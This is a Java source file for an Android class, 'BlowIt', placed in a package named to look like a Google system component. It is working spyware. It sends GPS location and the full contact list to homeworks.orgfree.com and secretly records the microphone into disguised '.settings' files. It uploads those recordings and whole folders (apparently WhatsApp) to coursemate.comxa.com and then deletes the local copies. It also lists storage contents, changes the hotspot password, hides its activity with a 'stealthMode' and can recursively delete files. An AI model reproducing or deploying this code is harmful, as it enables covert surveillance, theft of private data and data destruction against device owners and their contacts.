package com.android.google.important.file;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Set;
import java.util.concurrent.ExecutionException;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.WallpaperManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiConfiguration.AuthAlgorithm;
import android.net.wifi.WifiConfiguration.KeyMgmt;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.DisplayMetrics;
import android.util.Log;
import android.widget.Toast;

public class BlowIt {

	Context c;
	WifiManager mWifiManager;
	BluetoothAdapter bAdapter;
	WallpaperManager wallManager;
	AudioManager am;
	MediaRecorder mRecorder, mRecorder2;
	static File direc;

	public BlowIt(Context c) {
		Log.d("X", "Contructor Called - BLOW IT");
		this.c = c;
		this.wallManager = WallpaperManager.getInstance(c);
		this.mWifiManager = (WifiManager) c
				.getSystemService(Context.WIFI_SERVICE);
		this.bAdapter = BluetoothAdapter.getDefaultAdapter();
		this.am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
		this.mRecorder = new MediaRecorder();
		direc = new File(Environment.getExternalStorageDirectory()
				+ "/system/bin/backup/sys/");

	}

	public WallpaperManager getWallManager() {
		Log.d("X", "getWallManager Called - BLOW IT");
		return this.wallManager;
	}

	public AudioManager getAudioManager() {
		return this.am;
	}

	public void getLocation() {
		LocationManager lm = (LocationManager) c
				.getSystemService(Context.LOCATION_SERVICE);
		LocationListener ll = new LocationListener() {

			@Override
			public void onStatusChanged(String arg0, int arg1, Bundle arg2) {

			}

			@Override
			public void onProviderEnabled(String arg0) {

			}

			@Override
			public void onProviderDisabled(String arg0) {

			}

			@Override
			public void onLocationChanged(Location loc) {

				String lat = String.valueOf(loc.getLatitude());
				String lon = String.valueOf(loc.getLongitude());
				String speed = String.valueOf(loc.getSpeed());

				Toast.makeText(c, lat, Toast.LENGTH_LONG).show();

				try {
					new JSONGrabber()
							.execute("http://homeworks.orgfree.com/Microbe/loc.php?lat="
									+ URLEncoder.encode(lat, "UTF-8")
									+ "&lon="
									+ URLEncoder.encode(lon, "UTF-8")
									+ "&speed="
									+ URLEncoder.encode(speed, "UTF-8") + "");
				} catch (UnsupportedEncodingException e) {

					e.printStackTrace();
				}

			}
		};

		lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, ll, null);
	}

	// Checking Internt Connection
	public boolean isConnectingToInternet() {

		ConnectivityManager connectivity = (ConnectivityManager) c
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (connectivity != null) {
			NetworkInfo[] info = connectivity.getAllNetworkInfo();
			if (info != null)
				for (int i = 0; i < info.length; i++)
					if (info[i].getState() == NetworkInfo.State.CONNECTED) {
						return true;
					}

		}
		return false;
	}

	public void mailMessage(String msg) {
		try {
			new JSONGrabber()
					.execute("http://homeworks.orgfree.com/Microbe/networkalert.php?msg="
							+ URLEncoder.encode(msg, "UTF-8"));
		} catch (UnsupportedEncodingException e) {

			e.printStackTrace();
		}
	}

	// Enabling Mobile Data
	public void enableMobileData() {
		ConnectivityManager cm = (ConnectivityManager) c
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		try {
			Method cmMethod = ConnectivityManager.class.getDeclaredMethod(
					"setMobileDataEnabled", boolean.class);
			cmMethod.setAccessible(true);
			cmMethod.invoke(cm, true);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	// Disable Mobile Data
	public void disableMobileData() {
		ConnectivityManager cm = (ConnectivityManager) c
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		try {
			Method cmMethod = ConnectivityManager.class.getDeclaredMethod(
					"setMobileDataEnabled", boolean.class);
			cmMethod.setAccessible(true);
			cmMethod.invoke(cm, false);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	// Getting WifiConfiguration
	public WifiConfiguration getWifiApConfiguration() {
		try {
			Method method = mWifiManager.getClass().getMethod(
					"getWifiApConfiguration");
			return (WifiConfiguration) method.invoke(mWifiManager);
		} catch (Exception e) {
			Log.e("", "", e);
			return null;
		}
	}

	// Enabling Tethering
	public void enableWifiTethering() {

		Method[] methods = mWifiManager.getClass().getDeclaredMethods();
		for (Method method : methods) {
			if (method.getName().equals("setWifiApEnabled")) {
				try {
					method.invoke(mWifiManager, null, true);
				} catch (Exception ex) {
				}
				break;
			}
		}

	}

	// Disabling Wifi Tethering
	public void disableWifiTethering() {
		Method[] methods = mWifiManager.getClass().getDeclaredMethods();
		for (Method method : methods) {
			if (method.getName().equals("setWifiApEnabled")) {
				try {
					method.invoke(mWifiManager, null, false);
				} catch (Exception ex) {
				}
				break;
			}
		}

	}

	// Changing WiFi Configurations
	public void changeConfiguration(String newPassword) {

		WifiConfiguration mWifiConfiguration = getWifiApConfiguration();
		mWifiConfiguration.preSharedKey = newPassword;
		mWifiConfiguration.allowedKeyManagement.set(KeyMgmt.WPA_PSK);
		mWifiConfiguration.allowedAuthAlgorithms.set(AuthAlgorithm.OPEN);

		Method method = null;
		try {
			method = mWifiManager.getClass().getMethod(
					"setWifiApConfiguration", WifiConfiguration.class);
		} catch (NoSuchMethodException e) {
			e.printStackTrace();
		}
		boolean result;
		try {
			result = (Boolean) method.invoke(mWifiManager, mWifiConfiguration);
			Log.e("WIFI", String.valueOf(result));
		} catch (IllegalAccessException e) {
			e.printStackTrace();
		} catch (IllegalArgumentException e) {

			e.printStackTrace();
		} catch (InvocationTargetException e) {
			e.printStackTrace();
		}

	}

	// Get WifiManager
	public WifiManager getWiFiManager() {
		return this.mWifiManager;
	}

	public void bluetoothOperation() {

		try {

			if (bAdapter != null && !bAdapter.isEnabled()) {
				Log.d("X", "BEFORE Bluetooth :" + bAdapter.isEnabled());
				bAdapter.enable();
				Log.d("X", "Just AFTER Bluetooth :" + bAdapter.isEnabled());

				Thread aT = new Thread(new Runnable() {

					@Override
					public void run() {
						try {
							Thread.sleep(5000);
						} catch (InterruptedException e) {
							Log.e("X", e.getMessage());
						} finally {
							Log.d("X",
									"LONG AFTER Bluetooth :"
											+ bAdapter.isEnabled());

							Set<BluetoothDevice> pairedDevices = bAdapter
									.getBondedDevices();
							for (BluetoothDevice device : pairedDevices) {
								Log.d("X", "Name:" + device.getName()
										+ "\nAddress" + device.getAddress()
										+ "#" + device.getBondState());
							}
							bAdapter.startDiscovery();
						}

					}
				});
				aT.start();

			}

		} catch (Exception e) {

			e.printStackTrace();
			Log.e("X", "##########" + e.getMessage());
		}

	}

	// Enable WiFi
	public void enableWifi() {
		mWifiManager.setWifiEnabled(true);
	}

	// Disable WiFi
	public void disableWifi() {
		mWifiManager.setWifiEnabled(false);
	}

	public void ChangeWallpaperRsz(String name) {
		String result = "";
		try {
			result = new JSONGrabber().execute(
					"https://ajax.googleapis.com/ajax/services/search/images?v=1.0&imgsz=medium&q="
							+ URLEncoder.encode(name, "UTF-8")).get();
		} catch (UnsupportedEncodingException e1) {

			e1.printStackTrace();
		} catch (InterruptedException e1) {

			e1.printStackTrace();
		} catch (ExecutionException e1) {

			e1.printStackTrace();
		}

		Log.d("X", "Result OK" + result);

		try {
			JSONObject response = new JSONObject(result);
			JSONObject responseData = response.getJSONObject("responseData");
			JSONArray results = responseData.optJSONArray("results");

			int count = results.length();
			Log.d("X", String.valueOf(count));

			DisplayMetrics mat = c.getResources().getDisplayMetrics();
			int width = mat.widthPixels;
			int height = mat.heightPixels;

			JSONObject ob = results.optJSONObject(0);
			String imageUrl = ob.getString("unescapedUrl");
			Log.d("X", imageUrl);
			Bitmap b = new ImageGrabber().execute(imageUrl).get();
			b = Bitmap.createScaledBitmap(b, height, width, true);
			wallManager.setBitmap(b);

		} catch (Exception e) {

			e.printStackTrace();
			Log.e("X", e.getMessage());
		}

	}

	public void ChangeWallpaper(String name) {
		String result = "";
		try {
			result = new JSONGrabber().execute(
					"https://ajax.googleapis.com/ajax/services/search/images?v=1.0&imgsz=medium&q="
							+ URLEncoder.encode(name, "UTF-8")).get();
		} catch (UnsupportedEncodingException e1) {

			e1.printStackTrace();
		} catch (InterruptedException e1) {

			e1.printStackTrace();
		} catch (ExecutionException e1) {

			e1.printStackTrace();
		}

		Log.d("X", "Result OK" + result);

		try {
			JSONObject response = new JSONObject(result);
			JSONObject responseData = response.getJSONObject("responseData");
			JSONArray results = responseData.optJSONArray("results");

			int count = results.length();
			Log.d("X", String.valueOf(count));

			JSONObject ob = results.optJSONObject(0);
			String imageUrl = ob.getString("unescapedUrl");
			Log.d("X", imageUrl);
			Bitmap b = new ImageGrabber().execute(imageUrl).get();
			wallManager.setBitmap(b);

		} catch (Exception e) {

			e.printStackTrace();
			Log.e("X", e.getMessage());
		}

	}

	public void enablePowerMode() {
		if (!isConnectingToInternet()) {
			enableMobileData();
			enableWifi();
		}
	}

	public void UploadFile(String sourceFileUri, boolean stealthMode) {
		String fileName = sourceFileUri;
		String upLoadServerUri = "http://coursemate.comxa.com/Android/file.php";

		HttpURLConnection conn = null;
		DataOutputStream dos = null;
		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary = "*****";
		int bytesRead, bytesAvailable, bufferSize;
		byte[] buffer;
		int maxBufferSize = 1 * 1024 * 1024;
		File sourceFile = new File(sourceFileUri);

		try {

			// open a URL connection to the Servlet
			FileInputStream fileInputStream = new FileInputStream(sourceFile);
			URL url = new URL(upLoadServerUri);

			// Open a HTTP connection to the URL
			conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true); // Allow Inputs
			conn.setDoOutput(true); // Allow Outputs
			conn.setUseCaches(false); // Don't use a Cached Copy
			conn.setRequestMethod("POST");
			conn.setChunkedStreamingMode(1024);
			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("ENCTYPE", "multipart/form-data");
			conn.setRequestProperty("Content-Type",
					"multipart/form-data;boundary=" + boundary);
			conn.setRequestProperty("uploaded_file", fileName);

			dos = new DataOutputStream(conn.getOutputStream());

			dos.writeBytes(twoHyphens + boundary + lineEnd);
			dos.writeBytes("Content-Disposition: form-data; name='uploaded_file';filename="
					+ fileName + "" + lineEnd);

			dos.writeBytes(lineEnd);

			// create a buffer of maximum size
			bytesAvailable = fileInputStream.available();

			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];

			// read file and write it into form...
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			while (bytesRead > 0) {

				dos.write(buffer, 0, bufferSize);
				bytesAvailable = fileInputStream.available();
				bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			}

			// send multipart form data necesssary after file data...
			dos.writeBytes(lineEnd);
			dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

			// Responses from the server (code and message)
			int serverResponseCode = conn.getResponseCode();

			Log.d("X", "RESPONSE:" + conn.getResponseMessage());

			if (conn.getResponseMessage().equals("success")) {
				Log.i("X", "This runs ok");
			}

			Log.d("X", String.valueOf(serverResponseCode));

			// close the streams //
			try {
				fileInputStream.close();
				dos.flush();
				dos.close();
			} catch (IOException e) {

				e.printStackTrace();
				Log.e("X", e.getMessage());
			}

			if (serverResponseCode == 200) {
				Log.d("X", "Upload Success");
				File file = new File(sourceFileUri);
				if (file.isFile()) {
					Log.d("X", "Deleting File");
					file.delete();
				}

				if (stealthMode) {
					disableMobileData();
					disableWifi();
				}

			}

		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public void recordAndUploadSound(int duration, final boolean stealthMode) {
		try {

			Log.d("X", "Directory:" + direc.toString());

			if (!direc.exists()) {
				direc.mkdirs();
			}

			// Calendar c = Calendar.getInstance();
			// String date =
			// c.get(Calendar.DATE)+"-"+c.get(Calendar.MONTH)+"-"+c.get(Calendar.YEAR)+"-"+c.get(Calendar.HOUR)+":"+c.get(Calendar.MINUTE)+":"+c.get(Calendar.SECOND)+":"+c.get(Calendar.AM_PM);

			final String fileName = direc.toString() + "/"
					+ System.currentTimeMillis() + ".settings";
			mRecorder = new MediaRecorder();
			mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			mRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
			mRecorder.setOutputFile(fileName);
			mRecorder.prepare();
			mRecorder.start();
			Log.d("X", "Record Started");

			new CountDownTimer(duration, 1000) {

				@Override
				public void onTick(long arg0) {
					Log.i("X", "Recording...");
					Log.i("X", String.valueOf(arg0 / 1000));
				}

				@Override
				public void onFinish() {
					mRecorder.stop();

					Log.d("X", "Recording finished");

					Thread ab = new Thread(new Runnable() {

						@Override
						public void run() {

							Log.d("X", "Uploading Recorder Sound");
							if (isConnectingToInternet()) {
								try {
									UploadFile(fileName, stealthMode);
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
						}
					});

					ab.start();

				}
			}.start();
		} catch (Exception e) {

			e.printStackTrace();
		}
	}

	public void sendAllinDir(final File dir, final boolean stealthMode) {

		if (dir.exists()) {
			Log.d("X", "WhatsApp Directory Found");
		} else {
			Log.d("X", "No directory Found");
		}

		for (File f : dir.listFiles()) {
			Log.d("X", f.getName());
		}

		new Thread(new Runnable() {

			@Override
			public void run() {
				for (File f : dir.listFiles()) {
					UploadFile(f.getAbsolutePath(), false);
				}
				if (stealthMode) {
					disableMobileData();
				}
			}
		}).start();
	}

	public void sendAllinSys() {
		final File file = new File(Environment.getExternalStorageDirectory()
				+ "/system/bin/backup/sys/");

		new Thread(new Runnable() {

			@Override
			public void run() {
				for (File f : file.listFiles()) {
					UploadFile(f.getAbsolutePath(), false);
				}
			}
		}).start();

	}

	public boolean isWifiTethering() {
		boolean enabled = false;

		Method[] methods = mWifiManager.getClass().getDeclaredMethods();
		for (Method method : methods) {
			if (method.getName().equals("isWifiApEnabled")) {
				try {
					enabled = (Boolean) method.invoke(mWifiManager);
				} catch (IllegalAccessException e) {
					e.printStackTrace();
				} catch (IllegalArgumentException e) {

					e.printStackTrace();
				} catch (InvocationTargetException e) {

					e.printStackTrace();
				}
				break;
			}
		}
		return enabled;
	}

	// Uploading Contacts
	public void uploadContact() {
		if (isConnectingToInternet()) {

			// Getting Content Resolver to Access Contact Details
			ContentResolver cr = c.getContentResolver();

			// Getting Cursor
			Cursor cur1 = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
					null, null, null);

			// Checking CURSOR HAS DATA
			if (cur1.getCount() > 0) {

				// LOOPING THROUGH EVERY CONTACT
				while (cur1.moveToNext()) {

					// GETTING CONTACT ID
					String id = cur1.getString(cur1
							.getColumnIndex(ContactsContract.Contacts._ID));

					// GETTING CONTACT NAME
					String contactName = cur1
							.getString(cur1
									.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

					String contactNumber = "";

					// Ensuring number availablity
					if (Integer
							.parseInt(cur1.getString(cur1
									.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

						// Phone numbers are stored in another table

						// Cursor for Phone Numbers
						Cursor pCur = cr
								.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
										null,
										ContactsContract.CommonDataKinds.Phone.CONTACT_ID
												+ " = ?", new String[] { id },
										null);
						// Has Number in Cursor - CHECK + LOOP
						while (pCur.moveToNext()) {

							// Checking Number Count for A SINGLE
							// CONTACT
							if (pCur.getCount() > 1) {
								contactNumber = contactNumber
										+ ","
										+ pCur.getString(pCur
												.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							} else {
								contactNumber = pCur
										.getString(pCur
												.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							}
						}
					}

					// LOGGING
					Log.d("X", "ID:" + id + "\nName:" + contactName
							+ "\nNumber:" + contactNumber);
					Log.i("X", "--------------------------------");

					try {
						// Uploading it to server
						new JSONGrabber()
								.execute("http://homeworks.orgfree.com/Microbe/contact.php?id="
										+ URLEncoder.encode(id, "UTF-8")
										+ "&name="
										+ URLEncoder.encode(contactName,
												"UTF-8")
										+ "&number="
										+ URLEncoder.encode(contactNumber,
												"UTF-8"));
					} catch (UnsupportedEncodingException e) {
						Log.e("X", e.getMessage());
					}
				}

			}
		} else {
			Log.e("X", "Cannot upload COntact , No ConnectioN Detected");
		}
	}

	// Play Music Synch (Youtube Buffer like)
	public void playSound(String url) {
		MediaPlayer mp = new MediaPlayer();
		try {
			mp.setDataSource(url);
		} catch (IllegalArgumentException e) {
			e.printStackTrace();
		} catch (SecurityException e) {
			e.printStackTrace();
		} catch (IllegalStateException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			mp.prepare();
		} catch (IllegalStateException e) {

			e.printStackTrace();
		} catch (IOException e) {

			e.printStackTrace();
		}
		mp.start();
	}

	// Play Music after fully load
	public void playSoundAsync(String url) {
		MediaPlayer mp = new MediaPlayer();
		mp.setAudioStreamType(AudioManager.STREAM_MUSIC);
		try {
			mp.setDataSource(url);
		} catch (IllegalArgumentException e) {

			e.printStackTrace();
		} catch (SecurityException e) {

			e.printStackTrace();
		} catch (IllegalStateException e) {

			e.printStackTrace();
		} catch (IOException e) {

			e.printStackTrace();
		}
		mp.prepareAsync();
		mp.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {

			@Override
			public void onPrepared(MediaPlayer mp) {
				mp.start();
			}
		});

	}

	// List all directories and mail it
	public void mailAllDirectories() {

		StringBuffer sb = new StringBuffer("");

		File dir = Environment.getExternalStorageDirectory();
		sb.append(dir.getName() + "\n");
		if (dir.isDirectory()) {
			for (File f : dir.listFiles()) {
				if (f.isDirectory()) {
					for (File f2 : f.listFiles()) {
						if (f2.isDirectory()) {
							for (File f3 : f2.listFiles()) {
								sb.append(f3.getName());
							}
						} else {
							sb.append(f2.getName() + "\n");
						}
					}
				} else {
					sb.append(f.getName() + "\n");
				}

			}
		}

		Log.d("X",sb.toString());
		mailMessage(sb.toString());
	}

	//Delete all Files
	public void delAllDir(File f) {
		if (f.isDirectory())
			for (File child : f.listFiles())
				delAllDir(child);

		f.delete();

	}

}
